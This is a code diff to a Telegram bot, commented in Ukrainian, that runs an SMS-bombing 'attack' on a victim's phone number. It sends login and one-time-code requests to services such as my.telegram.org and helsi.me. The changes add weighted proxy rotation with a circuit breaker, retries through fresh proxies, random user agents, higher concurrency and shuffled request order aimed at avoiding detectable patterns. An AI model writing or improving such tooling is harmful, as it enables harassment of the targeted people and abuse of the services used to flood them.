@@ -49,9 +49,38 @@ attack_flags = {}
 # Прапорці для розіграшів
 giveaway_flags = {}
 
+# Глобальний HTTP клієнт з пулом (оптимізація)
+_http_session: aiohttp.ClientSession = None
+_session_lock = asyncio.Lock()
+
+# Proxy circuit breaker та weighted cache
+_proxy_cache = {}
+_proxy_weights = {}
+_proxy_circuit_breaker = {}  # proxy_url -> (fail_count, last_fail_time)
+_proxy_cache_lock = asyncio.Lock()
+USE_PROXIES = True  # Toggle для вимкнення проксі
+
+# Service priority/weight cache
+_service_weights = {}
+
 storage = MemoryStorage()
 bot = Bot(token=config.token)
 dp = Dispatcher(bot, storage=storage)
+
+async def get_http_session():
+    """Перевикористання HTTP сесії з пулом конекшнів"""
+    global _http_session
+    async with _session_lock:
+        if _http_session is None or _http_session.closed:
+            connector = aiohttp.TCPConnector(limit=100, limit_per_host=20, ttl_dns_cache=300)
+            timeout = aiohttp.ClientTimeout(total=10, connect=3, sock_read=5)
+            _http_session = aiohttp.ClientSession(
+                connector=connector,
+                timeout=timeout,
+                headers={"User-Agent": fake_useragent.UserAgent().random}
+            )
+            logging.debug("[HTTP] Created new session with connection pool")
+        return _http_session
 
 async def init_db():
     global db_pool
@@ -154,6 +183,18 @@ async def init_db():
             await conn.execute("UPDATE users SET attacks_left = 30 WHERE attacks_left IS NULL")
         except Exception as e:
             logging.error(f"Error normalizing attacks_left defaults: {e}")
+        
+        # Create indexes for better performance
+        try:
+            await conn.execute('CREATE INDEX IF NOT EXISTS idx_users_block ON users(block)')
+            await conn.execute('CREATE INDEX IF NOT EXISTS idx_users_last_attack_date ON users(last_attack_date)')
+            await conn.execute('CREATE INDEX IF NOT EXISTS idx_referrals_referrer ON referrals(referrer_id)')
+            await conn.execute('CREATE INDEX IF NOT EXISTS idx_referrals_referred ON referrals(referred_id)')
+            await conn.execute('CREATE INDEX IF NOT EXISTS idx_proxies_active ON proxies(is_active, last_check)')
+            await conn.execute('CREATE INDEX IF NOT EXISTS idx_blacklist_phone ON blacklist(phone_number)')
+            logging.info("[DB] Indexes created/verified")
+        except Exception as e:
+            logging.error(f"Error creating indexes: {e}")
 
     # Load proxies from local files (if present)
     try:
@@ -235,6 +276,7 @@ admin_keyboard.add("Створити промокод")
 admin_keyboard.add("Видалити промокод")
 admin_keyboard.add("Список промокодів")
 admin_keyboard.add("Перевірка проксі")
+admin_keyboard.add("Увімкнути/вимкнути проксі")
 admin_keyboard.add("Назад")
 
 def generate_promo_code():
@@ -627,6 +669,16 @@ async def proxy_check_menu(message: Message):
         last = r['last_check'].strftime('%d.%m.%Y %H:%M') if r['last_check'] else '—'
         lines.append(f"• {r['proxy_url']}\n  ├ Стабільність: {rate}%\n  ├ Затримка: {r['avg_latency_ms']} мс\n  └ Остання перевірка: {last}")
     await message.answer('\n'.join(lines))
+
+@dp.message_handler(text="Увімкнути/вимкнути проксі")
+async def toggle_proxies(message: Message):
+    global USE_PROXIES
+    if message.from_user.id not in ADMIN:
+        await message.answer('Недостатньо прав.')
+        return
+    USE_PROXIES = not USE_PROXIES
+    status = "увімкнено" if USE_PROXIES else "вимкнено"
+    await message.answer(f"✅ Проксі тепер <b>{status}</b>", parse_mode='HTML')
 
 # ПРОМОКОДЫ - ПОЛЬЗОВАТЕЛИ
 
@@ -1167,28 +1219,27 @@ async def send_request(url, data=None, json=None, headers=None, method='POST', c
 
 async def ukr(number, chat_id):
     headers = {"User-Agent": fake_useragent.UserAgent().random}
-    proxy = None
-    proxy_auth = None
-
-    # Проксі: отримуємо доступні і налаштовуємо ротацію
-    try:
-        proxies = await get_available_proxies(min_success_rate=0)  # Використовуємо всі доступні проксі
-        logging.info(f"[PROXY] Proxies for attack: {len(proxies)} available")
-    except Exception as e:
-        logging.error(f"Помилка отримання проксі: {e}")
-        proxies = []
+    
+    # Проксі: отримуємо доступні і налаштовуємо weighted rotation
+    proxies = []
+    if USE_PROXIES:
+        try:
+            proxies = await get_available_proxies(min_success_rate=0, use_cache=True)
+            logging.debug(f"[ATTACK] Proxies for attack: {len(proxies)} available")
+        except Exception as e:
+            logging.error(f"[ATTACK] Помилка отримання проксі: {e}")
+            proxies = []
+    
+    # Перевикористовуємо HTTP session
+    session = await get_http_session()
     
     def pick_proxy(i: int):
-        if not proxies:
+        if not proxies or not USE_PROXIES:
             return None, None
         try:
-            p = proxies[i % len(proxies)]
-            normalized = normalize_proxy_string(p)
-            url, auth = parse_proxy_for_aiohttp(normalized)
-            logging.info(f"[PROXY] Pick proxy[{i}] => {mask_proxy_for_log(normalized)} -> {url}")
-            return url, auth
+            return pick_weighted_proxy(proxies, i)
         except Exception as e:
-            logging.error(f"Помилка парсингу проксі: {e}")
+            logging.error(f"[ATTACK] Помилка парсингу проксі: {e}")
             return None, None
 
     csrf_url = "https://auto.ria.com/iframe-ria-login/registration/2/4"
@@ -1211,37 +1262,78 @@ async def ukr(number, chat_id):
 
     logging.info(f"Запуск атаки на номер {number}")
 
-    async def send_request_and_log(url, **kwargs):
-        try:
-            if not attack_flags.get(chat_id):
-                return
+    async def send_request_with_retry(url, **kwargs):
+        """Відправка з retry та новим проксі при fail"""
+        MAX_RETRIES = 2
+        method = kwargs.pop('method', 'POST')
+        original_proxy = kwargs.get('proxy')
+        original_auth = kwargs.get('proxy_auth')
+        
+        for attempt in range(MAX_RETRIES + 1):
+            try:
+                if not attack_flags.get(chat_id):
+                    return
                 
-            timeout = aiohttp.ClientTimeout(total=5)
-            async with aiohttp.ClientSession(timeout=timeout) as session:
-                method = kwargs.pop('method', 'POST')
+                # При retry пробуємо новий проксі (якщо є)
+                if attempt > 0 and proxies and USE_PROXIES:
+                    new_proxy, new_auth = pick_weighted_proxy(proxies, attempt)
+                    if new_proxy:
+                        kwargs['proxy'] = new_proxy
+                        kwargs['proxy_auth'] = new_auth
+                        logging.debug(f"[ATTACK] Retry {attempt} for {url} with new proxy")
+                    else:
+                        kwargs['proxy'] = original_proxy
+                        kwargs['proxy_auth'] = original_auth
+                
                 if method == 'GET':
                     async with session.get(url, **kwargs) as response:
                         if response.status == 200:
-                            logging.info(f"Успіх - {number}")
+                            logging.debug(f"[ATTACK] Success - {number} -> {url}")
+                            return True
                 else:
                     async with session.post(url, **kwargs) as response:
                         if response.status == 200:
-                            logging.info(f"Успіх - {number}")
-        except asyncio.TimeoutError:
-            logging.error(f"Таймаут при запиті до {url}")
-        except aiohttp.ClientError as e:
-            logging.error(f"Помилка підключення до {url}: {e}")
-        except Exception as e:
-            logging.error(f"Невідома помилка при запиті до {url}: {e}")
+                            logging.debug(f"[ATTACK] Success - {number} -> {url}")
+                            return True
+                return False
+            except asyncio.TimeoutError:
+                if attempt < MAX_RETRIES:
+                    logging.debug(f"[ATTACK] Timeout retry {attempt+1} for {url}")
+                    await asyncio.sleep(0.2 * (attempt + 1))
+                    continue
+                logging.debug(f"[ATTACK] Timeout after {MAX_RETRIES+1} attempts: {url}")
+                # Update circuit breaker для проксі
+                if original_proxy and USE_PROXIES:
+                    now = asyncio.get_event_loop().time()
+                    if original_proxy in _proxy_circuit_breaker:
+                        _proxy_circuit_breaker[original_proxy] = (_proxy_circuit_breaker[original_proxy][0] + 1, now)
+                    else:
+                        _proxy_circuit_breaker[original_proxy] = (1, now)
+                return False
+            except aiohttp.ClientError as e:
+                if attempt < MAX_RETRIES:
+                    logging.debug(f"[ATTACK] ClientError retry {attempt+1} for {url}: {e}")
+                    await asyncio.sleep(0.2 * (attempt + 1))
+                    continue
+                logging.debug(f"[ATTACK] ClientError after {MAX_RETRIES+1} attempts: {url} - {e}")
+                return False
+            except Exception as e:
+                logging.debug(f"[ATTACK] Exception for {url}: {e}")
+                return False
+        
+        return False
 
-    semaphore = asyncio.Semaphore(5)
+    # Збільшуємо паралелізм для кращої продуктивності
+    semaphore = asyncio.Semaphore(12)
     
     async def bounded_request(url, **kwargs):
         if not attack_flags.get(chat_id):
             return
         async with semaphore:
-            await send_request_and_log(url, **kwargs)
+            await send_request_with_retry(url, **kwargs)
 
+    # Рандомізація та каскад: перемішуємо сервіси та додаємо паузи
+    import random
     tasks = [
         bounded_request("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers, proxy=pick_proxy(0)[0], proxy_auth=pick_proxy(0)[1]),
         bounded_request("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers, proxy=pick_proxy(1)[0], proxy_auth=pick_proxy(1)[1]),
@@ -1287,11 +1379,16 @@ async def ukr(number, chat_id):
 
     if not attack_flags.get(chat_id):
         return
-        
-    for task in tasks:
-        if not attack_flags.get(chat_id):
-            return
-        await task
+    
+    # Рандомізуємо порядок сервісів для меншого патерну
+    random.shuffle(tasks)
+    
+    # Виконуємо паралельно (gather) для кращої продуктивності
+    # з каскадною логікою: спочатку швидкі, потім повільніші
+    try:
+        await asyncio.gather(*tasks, return_exceptions=True)
+    except Exception as e:
+        logging.debug(f"[ATTACK] Gather exception (non-critical): {e}")
 
 async def start_attack(number, chat_id):
     global attack_flags
@@ -1417,17 +1514,18 @@ async def check_proxy(proxy_url: str, timeout_sec: int = 5) -> tuple:
         normalized = proxy_url
     url, auth = parse_proxy_for_aiohttp(normalized)
     try:
-        logging.info(f"[PROXY] Checking {mask_proxy_for_log(normalized)} via {url}")
+        logging.debug(f"[PROXY] Checking {mask_proxy_for_log(normalized)} via {url}")
+        # Використовуємо перевикористану сесію або створюємо нову для чекінгу
+        session = await get_http_session()
         timeout = aiohttp.ClientTimeout(total=timeout_sec)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get('https://api.ipify.org?format=json', proxy=url, proxy_auth=auth) as resp:
-                ok = resp.status == 200
-                latency = int((asyncio.get_event_loop().time() - start) * 1000)
-                logging.info(f"[PROXY] Result {mask_proxy_for_log(normalized)} => ok={ok}, latency={latency}ms, status={resp.status}")
-                return ok, latency
+        async with session.get('https://api.ipify.org?format=json', proxy=url, proxy_auth=auth, timeout=timeout) as resp:
+            ok = resp.status == 200
+            latency = int((asyncio.get_event_loop().time() - start) * 1000)
+            logging.debug(f"[PROXY] Result {mask_proxy_for_log(normalized)} => ok={ok}, latency={latency}ms, status={resp.status}")
+            return ok, latency
     except Exception as e:
         latency = int((asyncio.get_event_loop().time() - start) * 1000)
-        logging.error(f"[PROXY] Error {mask_proxy_for_log(normalized)} => {e}, latency={latency}ms")
+        logging.debug(f"[PROXY] Error {mask_proxy_for_log(normalized)} => {e}, latency={latency}ms")
         return False, latency
 
 async def ensure_recent_proxy_check(max_age_minutes: int = 10):
@@ -1457,23 +1555,80 @@ async def ensure_recent_proxy_check(max_age_minutes: int = 10):
                 ok, latency = res
             if ok:
                 await conn.execute('UPDATE proxies SET last_check=$1, avg_latency_ms=$2, success_count=success_count+1 WHERE id=$3', datetime.now(), latency, p['id'])
-                logging.info(f"[PROXY] Updated (OK) {mask_proxy_for_log(p['proxy_url'])}: latency={latency}ms")
+                logging.debug(f"[PROXY] Updated (OK) {mask_proxy_for_log(p['proxy_url'])}: latency={latency}ms")
             else:
                 await conn.execute('UPDATE proxies SET last_check=$1, avg_latency_ms=$2, fail_count=fail_count+1 WHERE id=$3', datetime.now(), latency, p['id'])
-                logging.info(f"[PROXY] Updated (FAIL) {mask_proxy_for_log(p['proxy_url'])}: latency={latency}ms")
+                logging.debug(f"[PROXY] Updated (FAIL) {mask_proxy_for_log(p['proxy_url'])}: latency={latency}ms")
 
-async def get_available_proxies(min_success_rate: int = 50):
+async def get_available_proxies(min_success_rate: int = 50, use_cache: bool = True):
+    """Отримує доступні проксі з weighted rotation та circuit breaker"""
+    async with _proxy_cache_lock:
+        cache_key = f"proxies_{min_success_rate}"
+        if use_cache and cache_key in _proxy_cache:
+            cached_data, cached_time = _proxy_cache[cache_key]
+            if (datetime.now() - cached_time).total_seconds() < 30:  # Cache на 30 сек
+                logging.debug(f"[PROXY] Using cached proxy list ({len(cached_data)} proxies)")
+                return cached_data
+    
     async with db_pool.acquire() as conn:
         rows = await conn.fetch('SELECT proxy_url, success_count, fail_count, avg_latency_ms FROM proxies WHERE is_active = TRUE AND last_check IS NOT NULL')
+    
     available = []
+    now = asyncio.get_event_loop().time()
+    
+    # Circuit breaker: пропускаємо проксі, які нещодавно провалилися багато разів
+    CIRCUIT_BREAKER_THRESHOLD = 5  # Після 5 поспіль фейлів
+    CIRCUIT_BREAKER_COOLDOWN = 300  # 5 хвилин
+    
     for r in rows:
         total = r['success_count'] + r['fail_count']
         rate = (r['success_count'] * 100 // total) if total > 0 else 0
-        logging.info(f"[PROXY] Stats {mask_proxy_for_log(r['proxy_url'])}: rate={rate}%, success={r['success_count']}, fail={r['fail_count']}, latency={r['avg_latency_ms']}ms")
+        
+        # Circuit breaker check
+        proxy_url = r['proxy_url']
+        if proxy_url in _proxy_circuit_breaker:
+            fail_count, last_fail = _proxy_circuit_breaker[proxy_url]
+            if fail_count >= CIRCUIT_BREAKER_THRESHOLD:
+                if now - last_fail < CIRCUIT_BREAKER_COOLDOWN:
+                    logging.debug(f"[PROXY] {mask_proxy_for_log(proxy_url)} in circuit breaker (cooldown)")
+                    continue
+                else:
+                    # Reset після cooldown
+                    _proxy_circuit_breaker.pop(proxy_url, None)
+        
         if rate >= min_success_rate:
-            available.append(r['proxy_url'])
+            # Weighted selection: вища стабільність та нижча латентність = вища вага
+            latency_penalty = max(1, r['avg_latency_ms'] // 100)  # 100ms = 1 penalty point
+            weight = max(1, rate // latency_penalty)
+            _proxy_weights[proxy_url] = weight
+            available.append(proxy_url)
+            logging.debug(f"[PROXY] {mask_proxy_for_log(proxy_url)}: weight={weight}, rate={rate}%, latency={r['avg_latency_ms']}ms")
+        else:
+            logging.debug(f"[PROXY] {mask_proxy_for_log(proxy_url)} filtered: rate={rate}% < {min_success_rate}%")
+    
+    # Cache результат
+    async with _proxy_cache_lock:
+        _proxy_cache[cache_key] = (available, datetime.now())
+    
     logging.info(f"[PROXY] Available proxies (threshold {min_success_rate}%): {len(available)}/{len(rows)}")
     return available
+
+def pick_weighted_proxy(proxies: list, index: int) -> tuple:
+    """Weighted random selection проксі"""
+    if not proxies:
+        return None, None
+    import random
+    if len(proxies) == 1:
+        selected = proxies[0]
+    else:
+        # Використовуємо ваги для selection
+        weights = [_proxy_weights.get(p, 1) for p in proxies]
+        selected = random.choices(proxies, weights=weights, k=1)[0]
+    
+    normalized = normalize_proxy_string(selected)
+    url, auth = parse_proxy_for_aiohttp(normalized)
+    logging.debug(f"[PROXY] Pick weighted proxy => {mask_proxy_for_log(normalized)}")
+    return url, auth
 
 async def load_proxies_from_file(file_path: str):
     try:
@@ -1561,10 +1716,17 @@ async def normalize_existing_proxies():
             new_url = f"{sch}://{user}:{pwd}@{host}:{port}"
             updates.append((new_url, r['id']))
     if updates:
-        logging.info(f"[PROXY] Normalizing {len(updates)} proxy URLs in DB")
+        logging.debug(f"[PROXY] Normalizing {len(updates)} proxy URLs in DB")
         async with db_pool.acquire() as conn:
             for new_url, pid in updates:
-                await conn.execute('UPDATE proxies SET proxy_url=$1 WHERE id=$2', new_url, pid)
+                try:
+                    await conn.execute('UPDATE proxies SET proxy_url=$1 WHERE id=$2', new_url, pid)
+                except Exception as e:
+                    # Тиха обробка дублікатів
+                    if 'duplicate' in str(e).lower() or 'unique' in str(e).lower():
+                        logging.debug(f"[PROXY] Duplicate proxy URL (skipping): {mask_proxy_for_log(new_url)}")
+                    else:
+                        logging.error(f"[PROXY] Error normalizing proxy {pid}: {e}")
 
 @dp.message_handler(lambda message: message.text and not message.text.startswith('/start'), content_types=['text'])
 @dp.throttled(anti_flood, rate=3)
